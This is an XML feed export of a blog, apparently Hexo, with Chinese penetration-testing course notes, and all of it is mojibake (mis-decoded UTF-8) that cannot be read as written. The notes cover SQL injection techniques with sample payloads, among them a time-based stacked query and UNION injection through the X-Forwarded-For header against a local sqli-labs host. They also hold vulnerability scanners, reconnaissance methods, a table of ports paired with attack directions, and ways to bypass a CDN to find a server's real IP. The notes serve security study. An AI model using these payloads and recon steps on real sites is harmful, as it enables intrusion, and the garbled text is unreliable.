è½¬æ¢æ—¶ï¼Œä¹Ÿå¯èƒ½å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥æ¼æ´ MYSQLå…¶ä»–æ³¨å…¥åŠ å¯†ç¼–ç æ³¨å…¥ -sqlilabs less21 (postæ³¨å…¥)å…ˆåŠ å¯†ï¼Œå†å¡«å†™inurl:MQ= äº†è§£ä¸»æµåŠ å¯†/ç¼–ç è§„å¾‹ base64æ³¨å…¥æ”»å‡»ç¨‹åºä»£ç ä¸­ä½¿ç”¨base64_decode($_GET('id')) å¯¹å‚æ•°è¿›è¡Œè§£ç  å¯¹ id' è¿›è¡Œbase64ç¼–ç åä¸º MSc= ï¼Œè€Œ%3dæ˜¯=çš„urlç¼–ç ï¼Œ æ‹¼æ¥ä¸º `MCs=%3d` åå°è¯•ï¼› 1 and 1=1 çš„base64ç¼–ç ä¸º ï¼Œ1 and 1=2 çš„base64ç¼–ç ä¸º ï¼Œ åˆ†åˆ«æ”¾åˆ°id=çš„åé—¨å°è¯•ï¼Œ ç»“æœå¦‚æœä¸åŒï¼Œåˆ™å­˜åœ¨æ¼æ´ ç»§ç»­ä½¿ç”¨order by ç»§ç»­ ` å…¶ä»–åˆ©ç”¨åœºæ™¯ï¼šè¿‡wafï¼Œ ç»•è¿‡æ£€æµ‹ å †å æŸ¥è¯¢æ³¨å…¥å †å æŸ¥è¯¢å¯ä»¥æ‰§è¡Œå¤šæ¡sqlè¯­å¥ï¼Œå¤šè¯­å¥ä¹‹é—´ä½¿ç”¨åˆ†å·éš”å¼€ï¼Œåœ¨ç¬¬äºŒä¸ªsqlè¯­å¥ä¸­æ„é€ è‡ªå·±è¦æ‰§è¡Œçš„è¯­å¥ ä¾‹å¦‚ï¼š ';select if(substr(user(),1,1)='r', sleep(5),1) -- + -- ä¸€èˆ¬åªä¼šè¿”å›ç¬¬ä¸€æ¡sqlçš„æ‰§è¡Œç»“æœ http://192.168.0.121:8080/Less-9/?id=1%27; select if(left(user(),4)='root',sleep(5), 0); -- + -- æ‰€ä»¥ï¼Œåœ¨ç¬¬äºŒæ¡è¯­å¥ä¸­ï¼Œå¯ä»¥ç§ç”¨updateæ›´æ–°æ•°æ®æˆ–è€…æ—¶é—´ç›²æ³¨è·å–æ•°æ® XFFæ³¨å…¥x-Forwarded-Forï¼Œ ä»£è¡¨å®¢æˆ·ç«¯çœŸå®çš„ipï¼Œ ä¿®æ”¹åå¯ä»¥ä¼ªé€ å®¢æˆ·ç«¯ipå°†xffå¤´æ”¹ä¸º:127.0.0.1è®¿é—®ï¼Œå¦‚æœè¿”å›æ­£å¸¸ï¼Œåˆ†åˆ«è®¾ç½®ä¸º127.0.0.1' and 1=1# å’Œ127.0.0.1' and 1=2#å†æ¬¡è®¿é—® ï¼Œæ ¹æ®è¿”å›ç»“æ„åˆ¤æ–­æœ‰æ²¡æœ‰æ¼æ´ç»§ç»­ä½¿ç”¨order byï¼Œ è€Œåä½¿ç”¨union 127.0.0.1' union select 1,2,3# phpä¸­çš„getenv()å‡½æ•°ç”¨äºè·å–ä¸€ä¸ªç¯å¢ƒå˜é‡çš„å€¼ ï¼Œå¦‚æœä¸å­˜åœ¨è¿”å›false ä¸‹æ¬¡è¯¾ç»§ç»­â€¦ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[03-æ¼æ´å‘ç°]]></title>
    <url>%2Fposts%2Fcbce3690%2F</url>
    <content type="text"><![CDATA[åŸºäºWEBåº”ç”¨æ‰«ææµ‹è¯•è¢«åŠ¨å¼æ‰«æ x-ray ï¼ˆé•¿äº­ç§‘æŠ€å¼€å‘çš„ï¼‰ https://xray.cool/xray/#/tutorial/introduce Github: https://github.com/chaitin/xray/releases ï¼ˆå›½å¤–é€Ÿåº¦å¿«ï¼‰ç½‘ç›˜: https://yunpan.360.cn/surl_y3Gu6cugi8u ï¼ˆå›½å†…é€Ÿåº¦å¿«ï¼‰ ä¸»åŠ¨å¼æ‰«æ ï¼šå·¥å…·ï¼š awvsï¼ˆå¯ä»¥å½•åˆ¶å¡«å†™è´¦å·å¯†ç ï¼‰ã€ netsparkerã€ appscan(ç‰¹åˆ«å ç”¨ç”µè„‘èµ„æº) æ³¨æ„éªŒè¯åæ‰«æ æ— éªŒè¯ç ï¼šæ¨¡æ‹Ÿç™»é™† æ¯”å¦‚ awvsï¼ˆå¯ä»¥å½•åˆ¶å¡«å†™è´¦å·å¯†ç ï¼‰ æœ‰éªŒè¯ç ï¼šå¸¦å…¥cookie æ¯”å¦‚ awvsï¼ˆæ¡Œé¢ç‰ˆï¼šæ‰«æoption-&gt;cookieã€‚ç½‘é¡µç‰ˆï¼šcustom cookie, æŠŠç½‘é¡µæ•°æ®åŒ…èµ‹å€¼è¿‡æ¥ï¼‰ æŠ“appæ•°æ®åŒ…çš„å·®å¼‚å¯¼è‡´é—®é¢˜ï¼šawvs(custome headerçš„æ·»åŠ ï¼›æ—§ç‰ˆï¼šheader and cookie) åŸºäºæ“ä½œç³»ç»Ÿæ‰«ææµ‹è¯•Nessus Openvas Goby åŸºäºNMAPä½¿ç”¨æ‰«ææµ‹è¯•https://blog.csdn.net/qq_29277155/article/details/50977143 å…¶ä»–å®‰å…¨æ¼æ´æ‰«æè¡¥å……æœªæˆæƒè®¿é—® ä¸­é—´ä»¶å®‰å…¨ é€»è¾‘è¶Šæƒé—®é¢˜ æ›´å¤šå®‰å…¨æ‰«æè§ï¼šhttps://www.uedbox.com/tools/type/scanner/ æ³¨æ„ï¼šéƒ¨åˆ†æ¼æ´ï¼ˆè¶Šæƒï¼‰åˆ©ç”¨å·¥å…·æ— æ³•æ¢é’ˆï¼Œåªèƒ½æ‰‹å·¥ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[02-æ¼æ´åˆ†ç±»]]></title>
    <url>%2Fposts%2Fe6239764%2F</url>
    <content type="text"><![CDATA[1.äº†è§£æœ‰é‚£äº›æ¼æ´åç§°ï¼Ÿsqlæ³¨å…¥ï¼Œæ–‡ä»¶ä¸Šä¼ ï¼Œxssè·¨ç«™ï¼Œä»£ç æ‰§è¡Œï¼Œå‘½ä»¤æ‰§è¡Œï¼Œä»»æ„ä¸‹è½½ï¼Œç›®å½•éå†ï¼Œæ–‡ä»¶æ³„æ¼ï¼Œæ–‡ä»¶åŒ…å«ï¼Œé€»è¾‘è¶Šæƒï¼Œç¼“å†²åŒºæº¢å‡ºç­‰ 2.äº†è§£æ¼æ´çš„äº§ç”Ÿå±‚é¢ï¼Ÿwebåº”ç”¨ï¼Œç³»ç»Ÿå±‚é¢ï¼Œç¬¬ä¸‰æ–¹è½¯ä»¶ï¼ˆæ•°æ®åº“,ä¸­é—´ä»¶ï¼‰ å‘Šè¯‰å¤§å®¶ä¸€ä¸ªé“ç†ï¼š åœ¨webåº”ç”¨æˆ–appç­‰å…¶ä»–åº”ç”¨æä¾›æœåŠ¡çš„åŒæ—¶ï¼Œå…¶ä¸­æä¾›æœåŠ¡çš„æ‰€æœ‰å¯¹è±¡ï¼ˆå¦‚æ­å»ºå¹³å°ï¼Œæ•°æ®åº“ï¼Œç½‘ç«™ç¨‹åºï¼ŒæœåŠ¡å™¨æ“ä½œç³»ç»Ÿï¼Œç”¨åˆ°ç¬¬ä¸‰æ–¹ç®¡ç†è½¯ä»¶ç­‰ï¼‰å‡å­˜åœ¨æ¼æ´çš„å¯èƒ½æ€§ã€‚ 3.äº†è§£æ¼æ´çš„å½±å“èŒƒå›´ï¼Ÿå¦‚ï¼šæ³¨å…¥ æœ‰çš„å¯ä»¥è¿›è¡Œæ–‡ä»¶æ“ä½œ æœ‰çš„åªèƒ½è·å–æ•°æ® ä¸Šä¼  ç›´æ¥é€šè¿‡ä¸Šä¼ æ¼æ´æˆåŠŸä¸Šä¼ æ§åˆ¶åé—¨ å‘Šè¯‰å¤§å®¶ä¸€ä¸ªé“ç†ï¼š åœ¨åšå®‰å…¨æµ‹è¯•çš„æ—¶å€™ï¼Œæµ‹è¯•çš„ç›®çš„æ˜¯å¦å¯ä»¥æ ¹æ®å½“å‰å‘ç°çš„æ¼æ´å®ç°ï¼ˆæ¯ä¸ªæ¼æ´èƒ½é€ æˆçš„å±å®³éƒ½ä¸ä¸€æ ·ï¼Œæœ‰å¤§æœ‰å°ã€‚ï¼‰ 4.äº†è§£ç›®å‰ä¸»æµçš„æ¼æ´ï¼Ÿ5.äº†è§£æ¼æ´çš„å‘ç°æŒ–æ˜ï¼Ÿé»‘ç›’æµ‹è¯•ï¼šæ²¡æºç  å…¶ä»–æƒ…å†µä¸çŸ¥é“çš„æµ‹è¯•ç™½ç›’æµ‹è¯•ï¼šä»£ç å®¡è®¡ æºç æŒ–æ˜æ¼æ´ FUZZ è½¯ä»¶æµ‹è¯• å·¥å…·ï¼š Awvsï¼šwebåº”ç”¨ä¸€å—çš„ Nmapï¼šå…¨èƒ½å‹çš„ ç»†åˆ†ä¸å¤Ÿ Appscan: webåº”ç”¨ä¸€å—çš„ nessusï¼šæ“ä½œç³»ç»Ÿä¸€å—çš„-ç¬¬ä¸‰æ–¹è½¯ä»¶ï¼šé€šè¿‡ ã€ç«¯å£ã€‘ æˆ–ã€ æœåŠ¡ ã€‘æ¢é’ˆåˆ°ä½¿ç”¨åˆ°æŸäº›ç¬¬ä¸‰æ–¹è½¯ä»¶ï¼Œå¦‚weblogicæˆ–hfsï¼Œå¯ä»¥å†é€šè¿‡ã€ æ¼æ´å¹³å° ã€‘æˆ– ã€æœç´¢å¼•æ“ã€‘ å¯»æ‰¾æŒ‡å®šæ¼æ´ã€‚exploit-dbï¼Œ seebugç­‰ ä¸€äº›webå·¥å…·ï¼š https://www.uedbox.com/tools/type/webapp/ 6.äº†è§£æ¼æ´çš„åˆ©ç”¨å½¢å¼ï¼Ÿæ‰‹å·¥æ“ä½œ å·¥å…·æˆ–è„šæœ¬å®ç° ç¼–è¯‘åˆ©ç”¨ä»£ç å®ç°ï¼ˆäºŒæ¬¡å¼€å‘ï¼‰ æ¼æ´å‘ç°é—®é¢˜ï¼š1.ç™»å½• document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[01-ä¿¡æ¯æœé›†]]></title>
    <url>%2Fposts%2Fa90b3e98%2F</url>
    <content type="text"><![CDATA[ä¸€äº›webå·¥å…·ï¼š https://www.uedbox.com/tools/type/webapp 1.æ”¶é›†åŸŸåä¿¡æ¯WhoisæŸ¥è¯¢åœ¨çº¿å·¥å…·ï¼š çˆ±ç«™ç½‘ ç«™é•¿ä¹‹å®¶ VirusTotal å¤‡æ¡ˆä¿¡æ¯æŸ¥è¯¢ ICPå¤‡æ¡ˆæŸ¥è¯¢ç½‘ å¤©çœ¼æŸ¥ 2.æ”¶é›†æ•æ„Ÿä¿¡æ¯Google hackingå¸¸ç”¨è¯­æ³•ï¼šsite:inurl:intext:filetype:intitle:link:info:cache: ç¼“å­˜ æ¯”å¦‚ï¼šsite:edu.cn intext:åå°ç®¡ç† è¿˜å¯ä»¥ç”¨å®ƒæ¥æœé›† åå°ï¼Œæ•°æ®åº“æ–‡ä»¶ï¼ŒSQLæ³¨å…¥ï¼Œé…ç½®ä¿¡æ¯ï¼Œæºä»£ç æ³„éœ²ï¼Œæœªæˆæƒè®¿é—®ï¼Œrobots.txtç­‰æ•æ„Ÿä¿¡æ¯ ç™¾åº¦ï¼Œå¿…åº”ï¼ŒYandex, é›…è™ï¼ŒShodanç­‰ç±»ä¼¼ 3.æ”¶é›†å­åŸŸåä¿¡æ¯å­åŸŸåæ£€æµ‹å·¥å…·å·¥å…·ï¼š Layerå­åŸŸåæŒ–æ˜æœº (æ¨è) K8 wydomain Sublist3r (æ¨èï¼Œ èƒ½åˆ—å‡ºå¤šç§èµ„æº) dnsmaper subDomainsBrute (æ¨èï¼Œpythonå¼€å‘çš„ï¼Œ å¯ä»¥ä½¿ç”¨å°å­—å…¸é€’å½’åœ°å‘ç°ä¸‰å››äº”çº§åŸŸå) Maltego CE â€¦â€¦ æœç´¢å¼•æ“æšä¸¾æ¯”å¦‚ï¼šæœç´¢ç™¾åº¦ä¸‹é¢çš„å­åŸŸåsite:baidu.com ç¬¬ä¸‰æ–¹èšåˆåº”ç”¨æšä¸¾å¾ˆå¤šç¬¬ä¸‰æ–¹æœåŠ¡æ±‡èšäº†å¤§é‡DNSæ•°æ®é›†ï¼Œ å¯ä»¥é€šè¿‡ä»–ä»¬æ£€ç´¢æŸä¸ªç»™å®šåŸŸåçš„å­åŸŸå å·¥å…·ï¼š DNSdumpster ç½‘ç«™ åœ¨çº¿DNSä¾¦æŸ¥å’Œæœç´¢çš„å·¥å…·æ¥æŒ–æ˜åˆ¶å®šåŸŸæ½œè—çš„å¤§é‡å­åŸŸ è¯ä¹¦é€æ˜åº¦(CT)å…¬å¼€æ—¥å¿—æšä¸¾æ˜¯è¯ä¹¦æˆæƒæœºæ„(CA)çš„ä¸€ä¸ªé¡¹ç›®ï¼Œ CAä¼šå°†æ¯ä¸ªSSL/TLSè¯ä¹¦å‘å¸ƒåˆ°å…¬å…±æ—¥å¿—ä¸­ã€‚ä¸€ä¸ªSSL/TLSè¯ä¹¦é€šå¸¸åŒ…å«åŸŸåã€å­åŸŸåã€é‚®ä»¶åœ°å€ â€¦ â€¦ æ–¹æ³•ï¼šæœ€ç®€å•çš„å°±æ˜¯ï¼š ä½¿ç”¨æœç´¢å¼•æ“æœç´¢ä¸€äº›å…¬å¼€çš„CTæ—¥å¿—æ¨èï¼š crt.sh: https://crt.sh ç½‘ç«™ https://censys.io ç½‘ç«™ å…¶ä»–å·¥å…·ï¼šä¸€äº›åœ¨çº¿ç½‘ç«™ å­åŸŸåçˆ†ç ´ç½‘ç«™ï¼š https://phpinfo.me/domain IPåæŸ¥ç»‘å®šåŸŸåç½‘ç«™ï¼š https://dns.zizhan.com 4. æ”¶é›†å¸¸ç”¨ç«¯å£ä¿¡æ¯ æ–¹ä¾¿å¯¹ç—‡ä¸‹è¯ å·¥å…·ï¼š Nmap æ— çŠ¶æ€æ‰«æå·¥å…· Masscan ZMap å¾¡å‰‘é«˜é€ŸTCPç«¯å£æ‰«æå·¥å…· https://www.cnblogs.com/botoo/p/10475402.html å¸¸ç”¨ç«¯å£å’Œæ”»å‡»æ–¹å‘æ±‡æ€»ï¼šæ–‡ä»¶å…±äº«æœåŠ¡ç«¯å£ ç«¯å£å· ç«¯å£è¯´æ˜ æ”»å‡»æ–¹å‘ 20/21/69 Ftp/Tftpæ–‡ä»¶ä¼ è¾“åè®® å…è®¸åŒ¿åçš„ä¸Šä¼ ã€ä¸‹è½½ã€çˆ†ç ´å’Œå—…æ¢æ“ä½œ 2049 NfsæœåŠ¡ é…ç½®ä¸å½“ 139 Samba çˆ†ç ´ã€æœªæˆæƒè®¿é—®ã€è¿œç¨‹ä»£ç æ‰§è¡Œ 389 Ldapç›®å½•è®¿é—®æƒé™ æ³¨å…¥ã€å…è®¸åŒ¿åè®¿é—®ã€å¼±å£ä»¤ æ³¨ï¼šFTPåè®®çš„ 21ç«¯å£ â€“&gt; ä¼ è¾“æ§åˆ¶ä¿¡æ¯ï¼Œ 20ç«¯å£ â€”&gt; ä¼ è¾“æ•°æ® è¿œç¨‹è¿æ¥æœåŠ¡ç«¯å£ ç«¯å£ ç«¯å£è¯´æ˜ æ”»å‡»æ–¹å‘ 22 SSHè¿œç¨‹è¿æ¥ çˆ†ç ´ã€SSHéš§é“åŠå†…ç½‘ä»£ç†è½¬å‘ã€æ–‡ä»¶ä¼ è¾“ 23 Telnetè¿œç¨‹è¿æ¥ çˆ†ç ´ã€å—…æ¢ã€å¼±å£ä»¤ 3389 Rdpè¿œç¨‹æ¡Œé¢è¿æ¥ Shiftåé—¨ï¼ˆéœ€Windows Server 2003 åŠä»¥ä¸‹ç³»ç»Ÿ ï¼‰ã€çˆ†ç ´ 5900 VNC å¼±å£ä»¤çˆ†ç ´ 5632 PyAnywhere æŠ“å¯†ç ã€ä»£ç æ‰§è¡Œ Webåº”ç”¨æœåŠ¡ç«¯å£ ç«¯å£å· ç«¯å£è¯´æ˜ æ”»å‡»æ–¹å‘ 80/443/8080 å¸¸è§çš„webæœåŠ¡ç«¯å£ Webæ”»å‡»ã€çˆ†ç ´ã€å¯¹äºæœåŠ¡å™¨ç‰ˆæœ¬æ¼æ´ 7001/ 7002 WebLogicæ§åˆ¶å° Javaååºåˆ—åŒ–ã€å¼±å£ä»¤ 8080/8089 JBoss/Resin/Jetty/Jenkins ååºåˆ—åŒ–ã€æ§åˆ¶å°å¼±å£ä»¤ 9090 WebSphereæ§åˆ¶å° Javaååºåˆ—åŒ–ã€å¼±å£ä»¤ 4848 GlassFish æ§åˆ¶å° å¼±å£ä»¤ 1352 Lotus dominoé‚®ä»¶æœåŠ¡ å¼±å£ä»¤ã€ä¿¡æ¯æ³„éœ²ã€çˆ†ç ´ 10000 Webmin-Webæ§åˆ¶é¢æ¿ å¼±å£ä»¤ æ•°æ®åº“æœåŠ¡ç«¯å£ ç«¯å£å· ç«¯å£è¯´æ˜ æ”»å‡»æ–¹å‘ 3306 Mysql æ³¨å…¥ã€ææƒã€çˆ†ç ´ 1433 MSSQLæ•°æ®åº“ æ³¨å…¥ã€ææƒã€SAå¼±å£ä»¤ã€çˆ†ç ´ 1521 Oracleæ•°æ®åº“ TNSçˆ†ç ´ã€æ³¨å…¥ã€åå¼¹Shell 5432 PostgreSQLæ•°æ®åº“ çˆ†ç ´ã€æ³¨å…¥ã€å¼±å£ä»¤ 28017/27018 MongoDB çˆ†ç ´ã€æœªæˆæƒè®¿é—® 6379 Redisæ•°æ®åº“ å¯å°è¯•æœªæˆæƒè®¿é—®ã€å¼±å£ä»¤çˆ†ç ´ 5000 SysBase/DB2æ•°æ®åº“ çˆ†ç ´ã€æ³¨å…¥ é‚®ä»¶æœåŠ¡ç«¯å£ ç«¯å£ ç«¯å£è¯´æ˜ æ”»å‡»æ–¹å‘ 25 SMTPé‚®ä»¶æœåŠ¡ é‚®ä»¶ä¼ªé€  110 POP3åè®® çˆ†ç ´ã€å—…æ¢ 142 IMAPåè®® çˆ†ç ´ ç½‘ç»œå¸¸è§åè®®ç«¯å£ ç«¯å£ ç«¯å£è¯´æ˜ æ”»å‡»æ–¹å‘ 53 DNSåŸŸåç³»ç»Ÿ å…è®¸åŒºåŸŸä¼ é€ã€DNSåŠ«æŒã€ç¼“å­˜æŠ•æ¯’ã€æ¬ºéª— 67/68 DHCPæœåŠ¡ åŠ«æŒã€æ¬ºéª— 161 SNMPåè®® çˆ†ç ´ã€æœé›†ç›®æ ‡å†…ç½‘ä¿¡æ¯ ç‰¹æ®ŠæœåŠ¡ç«¯å£ ç«¯å£ ç«¯å£è¯´æ˜ æ”»å‡»æ–¹å‘ 2181 ZookeeperæœåŠ¡ æœªæˆæƒè®¿é—® 8069 ZabbixæœåŠ¡ è¿œç¨‹æ‰§è¡Œã€SQLæ³¨å…¥ 9200 ElasticsearchæœåŠ¡ è¿œç¨‹æ‰§è¡Œ 11211 MemcacheæœåŠ¡ æœªæˆæƒè®¿é—® 512/513/514 Linux RexecæœåŠ¡ çˆ†ç ´ã€Rloginç™»å½• 873 RsyncæœåŠ¡ åŒ¿åè®¿é—®ã€æ–‡ä»¶ä¸Šä¼  3690 SvnæœåŠ¡ Svnæ³„éœ²ã€æœªæˆæƒè®¿é—® 50000 SAP Mannagement Console è¿œç¨‹æ‰§è¡Œ1 5.æŒ‡çº¹è¯†åˆ«åº”ç”¨ç¨‹åºåœ¨html, css, js ç­‰æ–‡ä»¶ä¸­å¤šå¤šå°‘å°‘ä¼šåŒ…å«ä¸€äº›ç‰¹å¾ç ï¼ˆæ¯”å¦‚: WordPressåœ¨robots.txtä¸­ä¼šåŒ…å«wp-admin, é¦–é¡µindex.phpä¸­ä¼šåŒ…å«generator=wordpress 3.xxï¼‰,å¸®åŠ©å¿«é€Ÿè¯†åˆ«CMS å¸¸è§çš„CMS(æ•´ç«™ç³»ç»Ÿ)ï¼š Dedecms(ç»‡æ¢¦) Discuz PHPWEB PHPCMS ECShop Dvbbs SiteWeaver ASPCMS å¸å›½ Z-Blog WordPress å·¥å…·ï¼š å¾¡å‰‘WebæŒ‡çº¹è¯†åˆ« What Web WEBrOBO æ¤°æ ‘ è½»é‡WEBæŒ‡çº¹è¯†åˆ« â€¦ åœ¨çº¿ç½‘ç«™å·¥å…·ï¼š BugScanerï¼š https://whatweb.bugscaner.com/look/ äº‘æ‚‰æŒ‡çº¹ï¼š https://www.yunsee.cn/finnger.html What Web: https://whatweb.net/ æ¨èé¡¹ç›®ï¼šhttps://github.com/Lucifer1993/cmsprint å›½å†…çš„https://github.com/anouarbensaad/vulnx å›½å¤–çš„https://github.com/Lucifer1993/AngelSword å›½å†…çš„ ï¼ˆåœæ­¢ç»´æŠ¤ï¼‰ phpStudyæ­å»ºçš„ç½‘ç«™ï¼Œæ•°æ®åŒ…éƒ½æœ‰ä»¥ä¸‹ç‰¹ç‚¹Server: Apache/2.4.23 (Win32) OpenSSL/1.0.23 mod_fcgid/2.3.9 6.æŸ¥æ‰¾çœŸå®IPå¦‚æœç›®æ ‡æœåŠ¡å™¨åªæœ‰ä¸€ä¸ªåŸŸå ï¼Œè·å–çœŸå®ipå°±éå¸¸é‡è¦å¦‚æœæ²¡æœ‰CDNï¼Œå¯ä»¥é€šè¿‡ www.ip138.comç­‰å·¥å…·è·å–ç›®æ ‡çš„ip CDNï¼ˆå†…å®¹åˆ†å‘ç½‘ç»œï¼Œ é€šä¿—è®²å°±æ˜¯é«˜é€Ÿç¼“å­˜æœåŠ¡å™¨ï¼ŒæŠŠå†…å®¹ç¼“å­˜åˆ°äº†è·ç¦»æˆ‘ä»¬æœ€è¿‘çš„èŠ‚ç‚¹æœåŠ¡å™¨ä¸Šé¢â€¦ï¼‰ åˆ¤æ–­æœ‰æ— CDNé‡‡ç”¨è¶…çº§pingç¬¬ä¸‰æ–¹å¹³å°åˆ¤æ–­ï¼šå”¯ä¸€IPæ— cdnï¼Œåä¹‹æœ‰cdnæˆ–è€…é‡‡ç”¨åœ¨çº¿ç½‘ç«™17CE (https://www17ce.com)è¿›è¡Œå…¨å›½å¤šåœ°åŒºçš„pingæœåŠ¡å™¨æ“ä½œ å·¥å…·ï¼š è¶…çº§ping ç«™é•¿å·¥å…·ç­‰ ç»•è¿‡CDNå¯»æ‰¾çœŸå®IPï¼ˆ1ï¼‰å†…éƒ¨é‚®ç®±æºä¸€èˆ¬é‚®ä»¶ç³»ç»Ÿéƒ½åœ¨å†…éƒ¨ï¼Œæ²¡æœ‰ç»è¿‡CDNè§£æé€šè¿‡ç½‘ç«™æ³¨å†Œç”¨æˆ·æˆ–è€…RSSè®¢é˜…åŠŸèƒ½ï¼ŒæŸ¥çœ‹é‚®ä»¶å¤´ä¸­çš„é‚®ä»¶æœåŠ¡å™¨åŸŸåIPï¼Œpingè¿™ä¸ªé‚®ä»¶æœåŠ¡å™¨çš„åŸŸåï¼Œå°±å¯ä»¥è·å–çœŸå®ipæ³¨æ„ï¼šå¿…é¡»æ˜¯ç›®æ ‡è‡ªå·±çš„é‚®ä»¶æœåŠ¡å™¨ï¼Œç¬¬ä¸‰æ–¹å…¬å…±é‚®ä»¶æœåŠ¡å™¨ä¸è¡Œ ï¼ˆ2ï¼‰æ‰«æç½‘ç«™æµ‹è¯•æ–‡ä»¶å¦‚ï¼šphpinfo, testç­‰ä¸€æ–‡ä»¶ï¼Œä»è€Œæ‰¾åˆ°çœŸå®ip ï¼ˆ3ï¼‰åˆ†ç«™åŸŸåå¾ˆå¤šä¸»ç«™è®¿é—®é‡å¤§ï¼ŒæŒ‚äº†CDNï¼Œä½†æ˜¯åˆ†ç«™æœ‰å¯èƒ½æ²¡æœ‰CDNå¯ä»¥é€šè¿‡pingäºŒçº§åŸŸåè·å–åˆ†ç«™ipï¼Œ å¾ˆå¯èƒ½å‡ºç°åˆ†ç«™å’Œä¸»ç«™éƒ¨ç½²åŒä¸€ä¸ªipï¼Œä½†æ˜¯åœ¨åŒä¸€ä¸ªCæ®µä¸‹é¢çš„æƒ…å†µï¼Œä»è€Œåˆ¤æ–­ç›®æ ‡çš„çœŸå®ipæ®µ ï¼ˆ4ï¼‰å›½å¤–è®¿é—®è¾ƒå°æˆ–è€…ä¸šåŠ¡é¢å‘å›½å†…çš„ç½‘ç«™çš„CDNå¾€å¾€åªå¯¹å›½å†…çš„ç”¨æˆ·è®¿é—®åŠ é€Ÿï¼Œè€Œå›½å¤–å°±ä¸ä¸€å®šäº†æ–¹æ³•ï¼š å¯ä»¥é€šè¿‡æŒ‚å›½å¤–çš„ä»£ç† æˆ–è€… ä½¿ç”¨å›½å¤–çš„åœ¨çº¿ä»£ç†ç½‘ç«™App Synthetic Monitor (https://asm.ca.com/en/ping.php)è®¿é—®å¯èƒ½ä¼šå¾—åˆ°çœŸå®ip ï¼ˆ5ï¼‰æŸ¥è¯¢åŸŸåè§£æè®°å½•ä¹Ÿè®¸ç›®æ ‡å¾ˆä¹…ä¹‹å‰æ²¡æœ‰ä½¿ç”¨CDNé€šè¿‡ç½‘ç«™NETCRAFT ï¼ˆhttps://www.netcraft.com/ï¼‰æ¥è§‚å¯ŸåŸŸåçš„ipå†å²è®°å½•ï¼Œä¹Ÿå¯ä»¥å¤§è‡´åˆ†æå‡ºçœŸå®ipæ®µ ï¼ˆ6ï¼‰ç›®æ ‡æœ‰è‡ªå·±çš„Appå¯ä»¥å°è¯•ç”¨Fiddlleræˆ–Burp Suite æŠ“å–Appçš„è¯·æ±‚ï¼Œä»è€Œæ‰¾åˆ°ç›®æ ‡çš„çœŸå®ip ï¼ˆ7ï¼‰ç»•è¿‡CloudFlare CDNæŸ¥æ‰¾çœŸå®IPå¾ˆå¤šç½‘ç«™éƒ½ä½¿ç”¨ CloudFlare æä¾›çš„cdnæœåŠ¡å¯é€šè¿‡åœ¨çº¿ç½‘ç«™FlareWatch (http://www.crimeflare.us/cfs.html#box) å¯¹CloudFlareå®¢æˆ·ç½‘ç«™è¿›è¡ŒçœŸå®ipæŸ¥è¯¢ (9) å…¶ä»–æ–¹æ³•å…¶ä»–æ–¹æ³•ï¼šé—ç•™æ–‡ä»¶ï¼ˆæ¯”å¦‚googleé•œåƒï¼‰ï¼Œæ‰«å…¨ç½‘(æ¯”å¦‚)ï¼Œé»‘æš—å¼•æ“ï¼Œdnså†å²è®°å½•ï¼ˆç¬¬ä¸‰æ–¹å¹³å°ï¼Œåˆšå¥½å¼€é€šcdnä¹‹å‰çš„ipåœ°å€ï¼‰ï¼Œä»¥é‡æ‰“é‡ï¼ˆéœ€è¦è‚‰é¸¡ï¼Œcdnçš„æµé‡ç”¨å®Œå°±æ˜¾ç¤ºçœŸå®ipï¼‰ https://get-site-ip.com/ é—ç•™æ–‡ä»¶ä¸­: phpinfoçš„server_ddrå­—æ®µï¼Œ http_x_forwarded_for ã€æ–‡ç« ï¼šã€‘ https://www.lstazl.com/cdnæ£€æµ‹ä¸ç»•è¿‡/ https://www.fujieace.com/penetration-test/cdn-find-ip.html ï¼ˆ8ï¼‰éªŒè¯è·å–çš„IP æ˜¯å¦çœŸå®ï¼Ÿå¦‚æœæ˜¯Webï¼š ç›´æ¥è¾“å…¥ipè®¿é—®ï¼Œçœ‹çœ‹ç›¸åº”é¡µé¢æ˜¯å¦å’Œè®¿é—®åŸŸåè¿”å›çš„ä¸€æ ·ç›®æ ‡æ®µæ¯”è¾ƒå¤§çš„æƒ…å†µä¸‹ï¼šå€ŸåŠ©Masscançš„å·¥å…·æ‰¹æ‰«æå¯¹åº”IPæ®µä¸­æ‰€æœ‰å¼€äº†80,443,8080ç«¯å£çš„ipï¼Œç„¶åé€ä¸ªipå°è¯•ï¼Œè§‚å¯Ÿå“åº”ç»“æœæ˜¯å¦æ˜¯ç›®æ ‡ç«™ç‚¹ 7.æ”¶é›†æ•æ„Ÿç›®å½• æ–‡ä»¶ä»ä¸­å¯ä»¥å‘ç°éšè—çš„åå°ç®¡ç†é¡µé¢ï¼Œæ–‡ä»¶ä¸Šä¼ é¡µé¢ï¼Œç”šè‡³ç½‘ç«™å¤‡ä»½æ–‡ä»¶å’Œæºç  å·¥å…·ï¼š DirBuster javaç¼–å†™çš„ï¼Œå›¾å½¢åŒ–ç•Œé¢ 